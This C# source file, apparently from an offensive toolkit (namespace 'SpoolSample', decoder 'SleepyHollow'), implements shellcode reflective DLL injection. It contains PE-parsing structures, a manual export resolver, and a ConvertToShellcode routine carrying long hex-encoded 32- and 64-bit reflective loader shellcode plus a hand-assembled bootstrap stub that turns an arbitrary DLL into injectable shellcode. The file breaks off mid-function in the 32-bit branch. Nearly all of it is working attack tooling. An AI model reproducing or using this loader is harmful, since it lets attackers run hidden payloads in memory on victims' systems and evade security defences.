using System;
using System.Collections.Generic;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;

namespace SpoolSample;

static class Native
{
    [Flags]
    public enum ProcessAccessFlags : uint
    {
        Terminate = 0x00000001,
        CreateThread = 0x00000002,
        VMOperation = 0x00000008,
        VMRead = 0x00000010,
        VMWrite = 0x00000020,
        DupHandle = 0x00000040,
        SetInformation = 0x00000200,
        QueryInformation = 0x00000400,
        Synchronize = 0x00100000,
        All = 0x001F0FFF
    }

    public const UInt64 MEM_COMMIT = 0x00001000;
    public const UInt64 MEM_RESERVE = 0x00002000;
    public const ushort PAGE_NOACCESS = 0x01;
    public const ushort PAGE_READONLY = 0x02;
    public const ushort PAGE_READWRITE = 0x04;
    public const ushort PAGE_WRITECOPY = 0x08;
    public const ushort PAGE_EXECUTE = 0x10;
    public const ushort PAGE_EXECUTE_READ = 0x20;
    public const ushort PAGE_EXECUTE_READWRITE = 0x40;
    public const ushort PAGE_EXECUTE_WRITECOPY = 0x80;
    public const UInt32 PAGE_NOCACHE = 0x200;
    public const UInt64 IMAGE_SCN_MEM_DISCARDABLE = 0x02000000;
    public const UInt64 IMAGE_SCN_MEM_EXECUTE = 0x20000000;
    public const UInt64 IMAGE_SCN_MEM_READ = 0x40000000;
    public const UInt64 IMAGE_SCN_MEM_WRITE = 0x80000000;
    public const UInt64 IMAGE_SCN_MEM_NOT_CACHED = 0x04000000;
    public const UInt32 MEM_DECOMMIT = 0x4000;
    public const UInt32 IMAGE_FILE_EXECUTABLE_IMAGE = 0x0002;
    public const UInt32 IMAGE_FILE_DLL = 0x2000;
    public const ushort IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE = 0x40;
    public const UInt32 IMAGE_DLLCHARACTERISTICS_NX_COMPAT = 0x100;
    public const UInt32 MEM_RELEASE = 0x8000;
    public const UInt32 TOKEN_QUERY = 0x0008;
    public const UInt32 TOKEN_ADJUST_PRIVILEGES = 0x0020;
    public const ushort SE_PRIVILEGE_ENABLED = 0x2;
    public const UInt32 ERROR_NO_TOKEN = 0x3f0;
}

public class PE
{
    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    struct IMAGE_DATA_DIRECTORY
    {
        public uint VirtualAddress;
        public uint Size;
    }

    //[StructLayout(LayoutKind.Sequential, Pack = 1)]
    [StructLayout(LayoutKind.Explicit)]
    unsafe struct IMAGE_SECTION_HEADER
    {
        [FieldOffset(0)]
        public fixed byte Name[8];

        [FieldOffset(8)]
        public uint PhysicalAddress;

        [FieldOffset(8)]
        public uint VirtualSize;

        [FieldOffset(12)]
        public uint VirtualAddress;

        [FieldOffset(16)]
        public uint SizeOfRawData;

        [FieldOffset(20)]
        public uint PointerToRawData;

        [FieldOffset(24)]
        public uint PointerToRelocations;

        [FieldOffset(28)]
        public uint PointerToLinenumbers;

        [FieldOffset(32)]
        public ushort NumberOfRelocations;

        [FieldOffset(34)]
        public ushort NumberOfLinenumbers;

        [FieldOffset(36)]
        public uint Characteristics;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    struct IMAGE_FILE_HEADER
    {
        public ushort Machine;
        public ushort NumberOfSections;
        public uint TimeDateStamp;
        public uint PointerToSymbolTable;
        public uint NumberOfSymbols;
        public ushort SizeOfOptionalHeader;
        public ushort Characteristics;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    struct IMAGE_EXPORT_DIRECTORY
    {
        public uint Characteristics;
        public uint TimeDateStamp;
        public ushort MajorVersion;
        public ushort MinorVersion;
        public uint Name;
        public uint Base;
        public uint NumberOfFunctions;
        public uint NumberOfNames;
        public uint AddressOfFunctions; // RVA from base of image
        public uint AddressOfNames; // RVA from base of image
        public uint AddressOfNameOrdinals; // RVA from base of image
    }

    enum IMAGE_DOS_SIGNATURE : ushort
    {
        DOS_SIGNATURE = 0x5A4D, // MZ
        OS2_SIGNATURE = 0x454E, // NE
        OS2_SIGNATURE_LE = 0x454C, // LE
    }

    enum MagicType : ushort
    {
        IMAGE_NT_OPTIONAL_HDR32_MAGIC = 0x10b,
        IMAGE_NT_OPTIONAL_HDR64_MAGIC = 0x20b,
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    struct IMAGE_DOS_HEADER
    {
        public IMAGE_DOS_SIGNATURE e_magic; // Magic number
        public ushort e_cblp; // public bytes on last page of file
        public ushort e_cp; // Pages in file
        public ushort e_crlc; // Relocations
        public ushort e_cparhdr; // Size of header in paragraphs
        public ushort e_minalloc; // Minimum extra paragraphs needed
        public ushort e_maxalloc; // Maximum extra paragraphs needed
        public ushort e_ss; // Initial (relative) SS value
        public ushort e_sp; // Initial SP value
        public ushort e_csum; // Checksum
        public ushort e_ip; // Initial IP value
        public ushort e_cs; // Initial (relative) CS value
        public ushort e_lfarlc; // File address of relocation table
        public ushort e_ovno; // Overlay number

        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 8)]
        public string e_res; // May contain 'Detours!'
        public ushort e_oemid; // OEM identifier (for e_oeminfo)
        public ushort e_oeminfo; // OEM information; e_oemid specific

        [MarshalAsAttribute(UnmanagedType.ByValArray, SizeConst = 10)]
        public ushort[] e_res2; // Reserved public ushorts
        public Int32 e_lfanew; // File address of new exe header
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    struct IMAGE_OPTIONAL_HEADER
    {
        //
        // Standard fields.
        //

        public MagicType Magic;
        public byte MajorLinkerVersion;
        public byte MinorLinkerVersion;
        public uint SizeOfCode;
        public uint SizeOfInitializedData;
        public uint SizeOfUninitializedData;
        public uint AddressOfEntryPoint;
        public uint BaseOfCode;
        public uint BaseOfData;
        public uint ImageBase;
        public uint SectionAlignment;
        public uint FileAlignment;
        public ushort MajorOperatingSystemVersion;
        public ushort MinorOperatingSystemVersion;
        public ushort MajorImageVersion;
        public ushort MinorImageVersion;
        public ushort MajorSubsystemVersion;
        public ushort MinorSubsystemVersion;
        public uint Win32VersionValue;
        public uint SizeOfImage;
        public uint SizeOfHeaders;
        public uint CheckSum;
        public ushort Subsystem;
        public ushort DllCharacteristics;
        public uint SizeOfStackReserve;
        public uint SizeOfStackCommit;
        public uint SizeOfHeapReserve;
        public uint SizeOfHeapCommit;
        public uint LoaderFlags;
        public uint NumberOfRvaAndSizes;
        public IMAGE_DATA_DIRECTORY ExportTable;
        public IMAGE_DATA_DIRECTORY ImportTable;
        public IMAGE_DATA_DIRECTORY ResourceTable;
        public IMAGE_DATA_DIRECTORY ExceptionTable;
        public IMAGE_DATA_DIRECTORY CertificateTable;
        public IMAGE_DATA_DIRECTORY BaseRelocationTable;
        public IMAGE_DATA_DIRECTORY Debug;
        public IMAGE_DATA_DIRECTORY Architecture;
        public IMAGE_DATA_DIRECTORY GlobalPtr;
        public IMAGE_DATA_DIRECTORY TLSTable;
        public IMAGE_DATA_DIRECTORY LoadConfigTable;
        public IMAGE_DATA_DIRECTORY BoundImport;
        public IMAGE_DATA_DIRECTORY IAT;
        public IMAGE_DATA_DIRECTORY DelayImportDescriptor;
        public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;
        public IMAGE_DATA_DIRECTORY Public;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    struct IMAGE_OPTIONAL_HEADER64
    {
        public MagicType Magic;
        public byte MajorLinkerVersion;
        public byte MinorLinkerVersion;
        public uint SizeOfCode;
        public uint SizeOfInitializedData;
        public uint SizeOfUninitializedData;
        public uint AddressOfEntryPoint;
        public uint BaseOfCode;
        public ulong ImageBase;
        public uint SectionAlignment;
        public uint FileAlignment;
        public ushort MajorOperatingSystemVersion;
        public ushort MinorOperatingSystemVersion;
        public ushort MajorImageVersion;
        public ushort MinorImageVersion;
        public ushort MajorSubsystemVersion;
        public ushort MinorSubsystemVersion;
        public uint Win32VersionValue;
        public uint SizeOfImage;
        public uint SizeOfHeaders;
        public uint CheckSum;
        public ushort Subsystem;
        public ushort DllCharacteristics;
        public ulong SizeOfStackReserve;
        public ulong SizeOfStackCommit;
        public ulong SizeOfHeapReserve;
        public ulong SizeOfHeapCommit;
        public uint LoaderFlags;
        public uint NumberOfRvaAndSizes;
        public IMAGE_DATA_DIRECTORY ExportTable;
        public IMAGE_DATA_DIRECTORY ImportTable;
        public IMAGE_DATA_DIRECTORY ResourceTable;
        public IMAGE_DATA_DIRECTORY ExceptionTable;
        public IMAGE_DATA_DIRECTORY CertificateTable;
        public IMAGE_DATA_DIRECTORY BaseRelocationTable;
        public IMAGE_DATA_DIRECTORY Debug;
        public IMAGE_DATA_DIRECTORY Architecture;
        public IMAGE_DATA_DIRECTORY GlobalPtr;
        public IMAGE_DATA_DIRECTORY TLSTable;
        public IMAGE_DATA_DIRECTORY LoadConfigTable;
        public IMAGE_DATA_DIRECTORY BoundImport;
        public IMAGE_DATA_DIRECTORY IAT;
        public IMAGE_DATA_DIRECTORY DelayImportDescriptor;
        public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;
        public IMAGE_DATA_DIRECTORY Public;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    struct IMAGE_NT_HEADERS64
    {
        public uint Signature;
        public IMAGE_FILE_HEADER FileHeader;
        public IMAGE_OPTIONAL_HEADER64 OptionalHeader;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    struct IMAGE_NT_HEADERS
    {
        public uint Signature;
        public IMAGE_FILE_HEADER FileHeader;
        public IMAGE_OPTIONAL_HEADER OptionalHeader;
    }

    public static unsafe class InteropTools
    {
        private static readonly Type SafeBufferType = typeof(SafeBuffer);
        public delegate void PtrToStructureNativeDelegate(
            byte* ptr,
            TypedReference structure,
            uint sizeofT
        );
        public delegate void StructureToPtrNativeDelegate(
            TypedReference structure,
            byte* ptr,
            uint sizeofT
        );
        const BindingFlags flags = BindingFlags.NonPublic | BindingFlags.Static;
        private static readonly MethodInfo PtrToStructureNativeMethod = SafeBufferType.GetMethod(
            "PtrToStructureNative",
            flags
        );
        private static readonly MethodInfo StructureToPtrNativeMethod = SafeBufferType.GetMethod(
            "StructureToPtrNative",
            flags
        );
        public static readonly PtrToStructureNativeDelegate PtrToStructureNative =
            (PtrToStructureNativeDelegate)
                Delegate.CreateDelegate(
                    typeof(PtrToStructureNativeDelegate),
                    PtrToStructureNativeMethod
                );
        public static readonly StructureToPtrNativeDelegate StructureToPtrNative =
            (StructureToPtrNativeDelegate)
                Delegate.CreateDelegate(
                    typeof(StructureToPtrNativeDelegate),
                    StructureToPtrNativeMethod
                );

        private static readonly Func<Type, bool, int> SizeOfHelper_f =
            (Func<Type, bool, int>)
                Delegate.CreateDelegate(
                    typeof(Func<Type, bool, int>),
                    typeof(Marshal).GetMethod("SizeOfHelper", flags)
                );

        public static void StructureToPtrDirect(TypedReference structure, IntPtr ptr, int size)
        {
            StructureToPtrNative(structure, (byte*)ptr, unchecked((uint)size));
        }

        public static void StructureToPtrDirect(TypedReference structure, IntPtr ptr)
        {
            StructureToPtrDirect(structure, ptr, SizeOf(__reftype(structure)));
        }

        public static void PtrToStructureDirect(IntPtr ptr, TypedReference structure, int size)
        {
            PtrToStructureNative((byte*)ptr, structure, unchecked((uint)size));
        }

        public static void PtrToStructureDirect(IntPtr ptr, TypedReference structure)
        {
            PtrToStructureDirect(ptr, structure, SizeOf(__reftype(structure)));
        }

        public static void StructureToPtr<T>(ref T structure, IntPtr ptr)
        {
            StructureToPtrDirect(__makeref(structure), ptr);
        }

        public static void PtrToStructure<T>(IntPtr ptr, out T structure)
        {
            structure = default(T);
            PtrToStructureDirect(ptr, __makeref(structure));
        }

        public static T PtrToStructure<T>(IntPtr ptr)
        {
            T obj;
            PtrToStructure(ptr, out obj);
            return obj;
        }

        public static int SizeOf<T>(T structure)
        {
            return SizeOf<T>();
        }

        public static int SizeOf<T>()
        {
            return SizeOf(typeof(T));
        }

        public static int SizeOf(Type t)
        {
            return SizeOfHelper_f(t, true);
        }
    }

    public static IntPtr Rva2Offset(uint dwRva, IntPtr PEPointer)
    {
        bool is64Bit = false;
        ushort wIndex = 0;
        ushort wNumberOfSections = 0;
        IntPtr imageSectionPtr;
        IMAGE_SECTION_HEADER SectionHeader;
        int sizeOfSectionHeader = Marshal.SizeOf(typeof(IMAGE_SECTION_HEADER));

        IMAGE_DOS_HEADER dosHeader = InteropTools.PtrToStructure<IMAGE_DOS_HEADER>(PEPointer);

        IntPtr NtHeadersPtr = (IntPtr)((UInt64)PEPointer + (UInt64)dosHeader.e_lfanew);

        var imageNtHeaders32 = (IMAGE_NT_HEADERS)
            Marshal.PtrToStructure(NtHeadersPtr, typeof(IMAGE_NT_HEADERS));
        var imageNtHeaders64 = (IMAGE_NT_HEADERS64)
            Marshal.PtrToStructure(NtHeadersPtr, typeof(IMAGE_NT_HEADERS64));

        if (imageNtHeaders64.OptionalHeader.Magic == MagicType.IMAGE_NT_OPTIONAL_HDR64_MAGIC)
            is64Bit = true;

        if (is64Bit)
        {
            imageSectionPtr = (IntPtr)(
                (
                    (Int64)NtHeadersPtr
                    + (Int64)Marshal.OffsetOf(typeof(IMAGE_NT_HEADERS64), "OptionalHeader")
                    + (Int64)imageNtHeaders64.FileHeader.SizeOfOptionalHeader
                )
            );
            SectionHeader = (IMAGE_SECTION_HEADER)
                Marshal.PtrToStructure(imageSectionPtr, typeof(IMAGE_SECTION_HEADER));
            wNumberOfSections = imageNtHeaders64.FileHeader.NumberOfSections;
        }
        else
        {
            imageSectionPtr = (IntPtr)(
                (
                    (Int64)NtHeadersPtr
                    + (Int64)Marshal.OffsetOf(typeof(IMAGE_NT_HEADERS), "OptionalHeader")
                    + (Int64)imageNtHeaders32.FileHeader.SizeOfOptionalHeader
                )
            );
            SectionHeader = (IMAGE_SECTION_HEADER)
                Marshal.PtrToStructure(imageSectionPtr, typeof(IMAGE_SECTION_HEADER));
            wNumberOfSections = imageNtHeaders32.FileHeader.NumberOfSections;
        }

        if (dwRva < SectionHeader.PointerToRawData)
            return (IntPtr)((UInt64)dwRva + (UInt64)PEPointer);

        for (wIndex = 0; wIndex < wNumberOfSections; wIndex++)
        {
            SectionHeader = (IMAGE_SECTION_HEADER)
                Marshal.PtrToStructure(
                    (IntPtr)((uint)imageSectionPtr + (uint)(sizeOfSectionHeader * (wIndex))),
                    typeof(IMAGE_SECTION_HEADER)
                );
            if (
                dwRva >= SectionHeader.VirtualAddress
                && dwRva < (SectionHeader.VirtualAddress + SectionHeader.SizeOfRawData)
            )
                return (IntPtr)(
                    (UInt64)(dwRva - SectionHeader.VirtualAddress + SectionHeader.PointerToRawData)
                    + (UInt64)PEPointer
                );
        }

        return IntPtr.Zero;
    }

    public static unsafe bool Is64BitDLL(byte[] dllBytes)
    {
        bool is64Bit = false;
        GCHandle scHandle = GCHandle.Alloc(dllBytes, GCHandleType.Pinned);
        IntPtr scPointer = scHandle.AddrOfPinnedObject();

        IMAGE_DOS_HEADER dosHeader = (IMAGE_DOS_HEADER)
            Marshal.PtrToStructure(scPointer, typeof(IMAGE_DOS_HEADER));

        IntPtr NtHeadersPtr = (IntPtr)((UInt64)scPointer + (UInt64)dosHeader.e_lfanew);

        var imageNtHeaders64 = (IMAGE_NT_HEADERS64)
            Marshal.PtrToStructure(NtHeadersPtr, typeof(IMAGE_NT_HEADERS64));
        var imageNtHeaders32 = (IMAGE_NT_HEADERS)
            Marshal.PtrToStructure(NtHeadersPtr, typeof(IMAGE_NT_HEADERS));

        if (imageNtHeaders64.Signature != 0x00004550)
            throw new ApplicationException("Invalid IMAGE_NT_HEADER signature.");

        if (imageNtHeaders64.OptionalHeader.Magic == MagicType.IMAGE_NT_OPTIONAL_HDR64_MAGIC)
            is64Bit = true;

        scHandle.Free();

        return is64Bit;
    }

    public static unsafe IntPtr GetProcAddressR(IntPtr PEPointer, string functionName)
    {
        bool is64Bit = false;

        IMAGE_DOS_HEADER dosHeader = (IMAGE_DOS_HEADER)
            Marshal.PtrToStructure(PEPointer, typeof(IMAGE_DOS_HEADER));

        IntPtr NtHeadersPtr = (IntPtr)((UInt64)PEPointer + (UInt64)dosHeader.e_lfanew);

        var imageNtHeaders64 = (IMAGE_NT_HEADERS64)
            Marshal.PtrToStructure(NtHeadersPtr, typeof(IMAGE_NT_HEADERS64));
        var imageNtHeaders32 = (IMAGE_NT_HEADERS)
            Marshal.PtrToStructure(NtHeadersPtr, typeof(IMAGE_NT_HEADERS));

        if (imageNtHeaders64.Signature != 0x00004550)
            throw new ApplicationException("Invalid IMAGE_NT_HEADER signature.");

        if (imageNtHeaders64.OptionalHeader.Magic == MagicType.IMAGE_NT_OPTIONAL_HDR64_MAGIC)
            is64Bit = true;

        IntPtr ExportTablePtr;

        if (is64Bit)
        {
            if ((imageNtHeaders64.FileHeader.Characteristics & 0x2000) != 0x2000)
                throw new ApplicationException("File is not a DLL, Exiting.");

            ExportTablePtr = (IntPtr)(
                (UInt64)PEPointer
                + (UInt64)imageNtHeaders64.OptionalHeader.ExportTable.VirtualAddress
            );
        }
        else
        {
            if ((imageNtHeaders32.FileHeader.Characteristics & 0x2000) != 0x2000)
                throw new ApplicationException("File is not a DLL, Exiting.");

            ExportTablePtr = (IntPtr)(
                (UInt64)PEPointer
                + (UInt64)imageNtHeaders32.OptionalHeader.ExportTable.VirtualAddress
            );
        }

        IMAGE_EXPORT_DIRECTORY ExportTable = (IMAGE_EXPORT_DIRECTORY)
            Marshal.PtrToStructure(ExportTablePtr, typeof(IMAGE_EXPORT_DIRECTORY));

        for (int i = 0; i < ExportTable.NumberOfNames; i++)
        {
            IntPtr NameOffsetPtr = (IntPtr)((ulong)PEPointer + (ulong)ExportTable.AddressOfNames);
            NameOffsetPtr += (i * Marshal.SizeOf(typeof(UInt32)));
            IntPtr NamePtr = (IntPtr)(
                (ulong)PEPointer + (uint)Marshal.PtrToStructure(NameOffsetPtr, typeof(uint))
            );

            string Name = Marshal.PtrToStringAnsi(NamePtr);

            if (Name.Contains(functionName))
            {
                IntPtr AddressOfFunctions = (IntPtr)(
                    (ulong)PEPointer + (ulong)ExportTable.AddressOfFunctions
                );
                IntPtr OrdinalRvaPtr = (IntPtr)(
                    (ulong)PEPointer
                    + (ulong)(
                        ExportTable.AddressOfNameOrdinals + (i * Marshal.SizeOf(typeof(UInt16)))
                    )
                );
                UInt16 FuncIndex = (UInt16)Marshal.PtrToStructure(OrdinalRvaPtr, typeof(UInt16));
                IntPtr FuncOffsetLocation = (IntPtr)(
                    (ulong)AddressOfFunctions + (ulong)(FuncIndex * Marshal.SizeOf(typeof(UInt32)))
                );
                IntPtr FuncLocationInMemory = (IntPtr)(
                    (ulong)PEPointer
                    + (uint)Marshal.PtrToStructure(FuncOffsetLocation, typeof(UInt32))
                );

                return FuncLocationInMemory;
            }
        }
        return IntPtr.Zero;
    }
}

public static class RDILoader
{
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate IntPtr ReflectiveLoader();

    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    delegate bool ExportedFunction(IntPtr userData, uint userLength);

    public static byte[] ConvertToShellcode(
        byte[] dllBytes,
        uint functionHash,
        byte[] userData,
        uint flags
    )
    {
        var encoded32 =
            "83EC488364241800B94C7726075355565733F6E822040000B949F702788944241CE814040000B958A453E589442420E806040000B910E18AC38BE8E8FA030000B9AFB15C948944242CE8EC030000B933009E9589442430E8DE0300008BD88B44245C8B783C03F8897C2410813F50450000740733C0E9B8030000B84C0100006639470475EEF647380175E80FB757060FB7471485D274228D4F2403C8837904008B017505034738EB030341043BC60F47F083C12883EA0175E38D44243450FFD38B4424388B5F508D50FF8D48FFF7D24803CE03C323CA23C23BC175976A046800300000536A00FFD58B77548BD88B44245C33C9894424148BD333C0895C2418408944242485F674378B6C246C8B5C241423E84E85ED74198BC72B44245C3BC8730F83F93C720583F93E7605C60200EB048A03880241434285F675D78B5C24180FB747060FB74F1485C0743883C72C03CF8B7C245C8B51F8488B3103D38B69FC03F78944245C85ED740F8A068802424683ED0175F58B44245C83C12885C075D58B7C24108BB78000000003F3897424148B460C85C0747D03C350FF5424208B6E108BF88B0603EB03C38944245C837D0000744F8B7424208B0885C9741E791C8B473C0FB7C98B4438782B4C38108B44381C8D04888B043803C7EB0C8B450083C00203C35057FFD689450083C5048B44245C83C0048944245C837D000075B98B7424148B462083C6148974241485C075878B7C24108BEB2B6F3483BFA4000000000F84AA0000008B97A000000003D38954245C8D4A048B01894C241485C00F848D0000008B328D78F803F38D4208D1EF8944242074606A028BD85A0FB70B4F668BC166C1E80C6683F80A74066683F803750B81E1FF0F0000012C31EB27663B442424751181E1FF0F00008BC5C1E81066010431EB0F663BC2750A81E1FF0F000066012C3103DA85FF75B18B5C24188B54245C8B4C241403118954245C8D4A048B01894C241485C00F8577FFFFFF8B7C24100FB747060FB74F1485C00F84B70000008B74245C8D6F3C03E948837DEC00894424240F86940000008B4D0033D2428BC1C1E81D23C28BD1C1EA1E83E201C1E91F85C0751885D275076A085E6A01EB056A045E6A0285C9580F44F0EB2C85D2751785C975046A10EB1585D2750B85C97418BE80000000EB1185C975056A205EEB086A4085C9580F45F08B4D008BC60D0002000081E1000000040F44C68BF08D442428508B45E856FF75EC03C350FF54243C85C00F84ECFCFFFF8B44242483C52885C00F8552FFFFFF8B77286A006A006AFF03F3FF54243C33C040505053FFD6837C246000747C837F7C0074768B4F7803CB8B411885C0746A8379140074648B69208B792403EB8364245C0003FB85C074518B750003F333D20FBE06C1CA0D03D046807EFF0075F13954246074168B44245C83C5044083C7028944245C3B411872D0EB1F0FB71783FAFF74178B411CFF742468FF7424688D04908B041803C3FFD059598BC35F5E5D5B83C448C383EC1064A1300000005355568B400C57894C24188B700CE98A0000008B463033C98B5E2C8B36894424148B423C8B6C1078896C241085ED746DC1EB1033FF85DB741F8B6C24148A042FC1C90D3C610FBEC07C0383C1E003C8473BFB72E98B6C24108B442A2033DB8B7C2A1803C2897C241485FF74318B2833FF03EA83C0048944241C0FBE4500C1CF0D03F845807DFF0075F08D040F3B44241874208B44241C433B5C241472CF8B561885D20F856BFFFFFF33C05F5E5D5B83C410C38B7424108B4416248D04580FB70C108B44161C8D04888B041003C2EBDB";
        var rdiShellcode32 = SleepyHollow.Decoder.DecodeString(encoded32);
        var encoded64 =
            "488BC4448948204C8940188950105355565741544155415641574883EC7883600800488BE9B94C772607448BFA33DBE8A4040000B949F702784C8BE8E897040000B958A453E54889442420E888040000B910E18AC3488BF0E87B040000B9AFB15C944889442430E86C040000B933009E9548894424284C8BE0E85A04000048637D3C4C8BD04803FD813F50450000740733C0E92D040000B8648600006639470475EE41BE010000004484773875E20FB747060FB74F14448B4F3885C0742C488D5724448BC04803D18B4A0485C975078B024903C1EB048B0203C1483BC3480F47D84883C2284D2BC675DE488D4C243841FFD2448B44243C448B4F50418D40FFF7D0418D50FF4103D1498D48FF4823D04803CB498D40FF48F7D04823C8483BD10F856BFFFFFF33C9418BD141B800300000448D4904FFD6448B475433D2488BF04C8BD5488BC8448D5A024D85C0743F448B8C24E00000004523CE4D2BC64585C97419488BC7482BC5483BD0730E488D42C4493BC37605C60100EB05418A0288014903D64D03D64903CE4D85C075CC440FB757060FB747144D85D27438488D4F2C4803C88B51F84D2BD6448B014803D6448B49FC4C03C54D85C97410418A004D03C688024903D64D2BCE75F04883C1284D85D275CF8B9F900000004803DE8B430C85C00F848A000000488B6C24208BC84803CE41FFD5448B3B4C8BE0448B73104C03FE4C03F6EB4949833F007D29496344243C410FB717428B8C2088000000428B442110428B4C211C482BD04903CC8B04914903C4EB0F498B16498BCC4883C2024803D6FFD54989064983C6084983C70849833E0075B18B43204883C31485C0758C448BBC24C8000000448D70014C8B6424284C8BCE41BD020000004C2B4F3083BFB4000000000F84950000008B97B00000004803D68B420485C00F8481000000BBFF0F0000448B024C8D5A08448BD04C03C64983EA0849D1EA7459410FB70B4D2BD60FB7C166C1E80C6683F80A75094823CB4E010C01EB346683F80375094823CB46010C01EB2566413BC675114823CB498BC148C1E8106642010401EB0E66413BC575084823CB6646010C014D03DD4D85D275A78B42044803D08B420485C075840FB76F060FB747144885ED0F84CF0000008B9C24C00000004C8D773C4C8B6C24304C03F048FFCD41837EEC000F869D000000458B06418BD0C1EA1E418BC0418BC8C1E81D83E201C1E91F83E001751E85D2750BF7D91BDB83E307FFC3EB3EF7D9B8020000001BDB23D803D8EB2F85D2751885C975058D5A10EB2285D2750B85C9741ABB80000000EB1385C975058D5920EB0A85C9B8400000000F45D8418B4EE84C8D8C24C0000000418B56EC8BC30FBAE8094181E0000000040F44C34803CE448BC08BD841FFD585C00F84A1FCFFFF4983C6284885ED0F8548FFFFFF448D6D028B5F284533C033D24883C9FF4803DE41FFD4BD01000000488BCE448BC58BD5FFD34585FF0F849700000083BF8C000000000F848A0000008B97880000004803D6448B5A184585DB7478837A14007472448B522033DB448B4A244C03D64C03CE4585DB745D458B024C03C633C9410FBE004C03C5C1C90D03C8418078FF0075ED443BF9741003DD4983C2044D03CD413BDB72D2EB2D410FB70183F8FF74248B521C488B8C24D0000000C1E00248984803C6448B04028B9424D80000004C03C641FFD0488BC64883C478415F415E415D415C5F5E5D5BC3CCCCCC48895C24084889742410574883EC1065488B0425600000008BF1488B50184C8B4A104D8B41304D85C00F84B4000000410F1041584963403C33D24D8B09F30F7F0424428B9C008800000085DB74D4488B042448C1E810440FB7D04585D27421488B4C2408458BDA0FBE01C1CA0D8039617C0383C2E003D048FFC14983EB0175E74D8D141833C9418B7A204903F841394A18768F8B1F4533DB4903D8488D7F040FBE0348FFC341C1CB0D4403D8807BFF0075ED418D04133BC6740DFFC1413B4A1872D1E95BFFFFFF418B422403C94903C00FB71401418B4A1C4903C88B04914903C0EB0233C0488B5C2420488B7424284883C4105FC3";
        var rdiShellcode64 = SleepyHollow.Decoder.DecodeString(encoded64);
        var newShellcode = new List<byte>();

        uint dllOffset = 0;

        if (PE.Is64BitDLL(dllBytes))
        {
            var rdiShellcode = rdiShellcode64;
            int bootstrapSize = 64;

            // call next instruction (Pushes next instruction address to stack)
            newShellcode.Add(0xe8);
            newShellcode.Add(0x00);
            newShellcode.Add(0x00);
            newShellcode.Add(0x00);
            newShellcode.Add(0x00);

            // Set the offset to our DLL from pop result
            dllOffset = (uint)(bootstrapSize - newShellcode.Count + rdiShellcode.Length);

            // pop rcx - Capture our current location in memory
            newShellcode.Add(0x59);

            // mov r8, rcx - copy our location in memory to r8 before we start modifying RCX
            newShellcode.Add(0x49);
            newShellcode.Add(0x89);
            newShellcode.Add(0xc8);

            // Setup the location of the DLL into RCX
            // add rcx, <Offset of the DLL>
            newShellcode.Add(0x48);
            newShellcode.Add(0x81);
            newShellcode.Add(0xc1);
            foreach (byte b in BitConverter.GetBytes(dllOffset))
                newShellcode.Add(b);

            // mov edx, <Hash of function>
            newShellcode.Add(0xba);
            foreach (byte b in BitConverter.GetBytes(functionHash))
                newShellcode.Add(b);

            // Put the location of our user data in
            // add r8, <Offset of the DLL> + <Length of DLL>
            newShellcode.Add(0x49);
            newShellcode.Add(0x81);
            newShellcode.Add(0xc0);
            foreach (byte b in BitConverter.GetBytes((uint)(dllOffset + dllBytes.Length)))
                newShellcode.Add(b);

            // mov r9d, <Length of User Data>
            newShellcode.Add(0x41);
            newShellcode.Add(0xb9);
            foreach (byte b in BitConverter.GetBytes((uint)userData.Length))
                newShellcode.Add(b);

            // push rsi - save original value
            newShellcode.Add(0x56);

            // mov rsi, rsp - store our current stack pointer for later
            newShellcode.Add(0x48);
            newShellcode.Add(0x89);
            newShellcode.Add(0xe6);

            // and rsp, 0x0FFFFFFFFFFFFFFF0 - Align the stack to 16 bytes
            newShellcode.Add(0x48);
            newShellcode.Add(0x83);
            newShellcode.Add(0xe4);
            newShellcode.Add(0xf0);

            // sub rsp, 0x30 - Create some breathing room on the stack
            newShellcode.Add(0x48);
            newShellcode.Add(0x83);
            newShellcode.Add(0xec);
            newShellcode.Add(6 * 8); // 32 bytes for shadow space + 8 bytes for last arg + 8 bytes for stack alignment

            // mov dword ptr [rsp + 0x20], <Flags> - Push arg 5 just above shadow space
            newShellcode.Add(0xc7);
            newShellcode.Add(0x44);
            newShellcode.Add(0x24);
            newShellcode.Add(4 * 8);
            foreach (byte b in BitConverter.GetBytes((uint)flags))
                newShellcode.Add(b);

            // call - Transfer execution to the RDI
            newShellcode.Add(0xe8);
            newShellcode.Add((byte)(bootstrapSize - newShellcode.Count - 4)); // Skip over the remainder of instructions
            newShellcode.Add(0x00);
            newShellcode.Add(0x00);
            newShellcode.Add(0x00);

            // mov rsp, rsi - Reset our original stack pointer
            newShellcode.Add(0x48);
            newShellcode.Add(0x89);
            newShellcode.Add(0xf4);

            // pop rsi - Put things back where we left them
            newShellcode.Add(0x5e);

            // ret - return to caller
            newShellcode.Add(0xc3);

            // Write the rest of RDI
            foreach (byte b in rdiShellcode)
                newShellcode.Add(b);

            // Write our DLL
            foreach (byte b in dllBytes)
                newShellcode.Add(b);

            // Write our userdata
            foreach (byte b in userData)
                newShellcode.Add(b);
        }
        else // 32 Bit
        {
            var rdiShellcode = rdiShellcode32;
            int bootstrapSize = 45;

            // call next instruction (Pushes next instruction address to stack)
            newShellcode.Add(0xe8);
            newShellcode.Add(0x00);
            newShellcode.Add(0x00);
            newShellcode.Add(0x00);
            newShellcode.Add(0x00);

            // Set the offset to our DLL from pop result
            dllOffset = (uint)(bootstrapSize - newShellcode.Count + rdiShellcode.Length);

            // pop ecx - Capture our current location in memory
            newShellcode.Add(0x58);

            // mov ebx, eax - copy our location in memory to ebx before we start modifying eax
            newShellcode.Add(0x89);
            newShellcode.Add(0xc3);

            // add eax, <Offset to the DLL>
            newShellcode.Add(0x05);
            foreach (byte b in BitConverter.GetBytes(dllOffset))
                newShellcode.Add(b);

            // add ebx, <Offset to the DLL> + <Size of DLL>
            newShellcode.Add(0x81);
